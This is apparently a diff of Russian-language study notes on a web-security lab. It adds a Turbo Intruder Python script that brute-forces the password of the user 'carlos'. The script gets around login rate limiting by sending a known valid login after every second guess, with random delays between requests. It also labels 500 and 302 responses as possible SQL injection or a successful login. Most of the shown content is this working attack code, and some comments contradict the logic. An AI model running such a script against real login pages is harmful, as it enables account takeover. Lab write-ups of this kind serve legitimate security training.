@@ -36,3 +36,138 @@
 но каждый 3 запрос вставлял в логин и пароль существующие данные моего реального аккаунта
 
 ==выполнено==
+
+```python
+import random
+
+import time
+
+try:
+
+    from urllib.parse import quote
+
+except ImportError:
+
+    from urllib import quote
+
+def queueRequests(target, wordlists):
+
+    MIN_DELAY = 120
+
+    MAX_DELAY = 200
+
+    # Используем только ОДИН запрос на соединение и 1 соединение
+
+    engine = RequestEngine(endpoint=target.endpoint,
+
+                          concurrentConnections=1,
+
+                          requestsPerConnection=1,  # Ключевое изменение!
+
+                          pipeline=False)
+
+    # Основной список паролей для %s
+
+    payloads = [
+
+        "123456",
+
+        "password"
+
+    ]
+
+    # === ШАГ 0: ВСЕГДА ПЕРВЫМ ЗАПРОСОМ ИЗВЕТСНЫЙ ЛОГ+ПАР- wiener:peter ===
+
+    encoded_first_user = quote("wiener", safe='')
+
+    encoded_first_pass = quote("peter", safe='')
+
+    first_request = target.req.replace('%ss', encoded_first_user)
+
+    first_request = first_request.replace('%s', encoded_first_pass)
+
+    first_delay = random.randint(MIN_DELAY, MAX_DELAY)
+
+    time.sleep(first_delay / 1000.0)
+
+    engine.queue(first_request)
+
+    # Счётчик запросов (уже отправили 1 запрос)
+
+    request_counter = 1  # Начинаем с 1, т.к. первый запрос уже отправлен
+
+  
+
+    for password_payload in payloads:
+
+        request_counter += 1
+
+        # === ШАГ 1: Каждый 3-й запрос - дополнительный wiener:peter ===
+
+        if request_counter % 2 == 0:  # КАЖДАЯ ЧЕТНАЯ 2 ПОПЫТКА - ПОДСТАВЛЮ ВАЛИДНЫЕ ЛОГ+ПАР
+
+            encoded_username_special = quote("wiener", safe='')
+
+            encoded_password_special = quote("peter", safe='')
+
+            special_request = target.req.replace('%ss', encoded_username_special)
+
+            special_request = special_request.replace('%s', encoded_password_special)
+
+            delay_special = random.randint(MIN_DELAY, MAX_DELAY)
+
+            time.sleep(delay_special / 1000.0)
+
+            engine.queue(special_request)
+
+        # === ШАГ 2: ОСНОВНОЙ ЗАПРОС (всегда отправляется) ===
+
+        # username ВСЕГДА = "carlos" для основного запроса
+
+        encoded_username_main = quote("carlos", safe='')
+
+        encoded_password_main = quote(password_payload, safe='')
+
+        main_request = target.req.replace('%ss', encoded_username_main)
+
+        main_request = main_request.replace('%s', encoded_password_main)
+
+        delay_main = random.randint(MIN_DELAY, MAX_DELAY)
+
+        time.sleep(delay_main / 1000.0)
+
+        engine.queue(main_request)
+
+  
+
+  
+
+def handleResponse(req, interesting):
+
+    if interesting:
+
+        req.label = "INTER"
+
+        table.add(req)
+
+    elif req.status == 500:
+
+        response_text = req.response.lower()
+
+        sql_indicators = ['sql', 'syntax', 'mysql', 'database', 'error', 'exception', 'warning']
+
+        if any(indicator in response_text for indicator in sql_indicators):
+
+            req.label = "POTENTIAL SQLi"
+
+            table.add(req)
+
+    elif req.status == 302:  # Добавил проверку на успешный логин
+
+        req.label = "SUCCESS_302"
+
+        table.add(req)
+```
+
+
+# УСТРАНЕНИЕ ПРОБЛЕМЫ
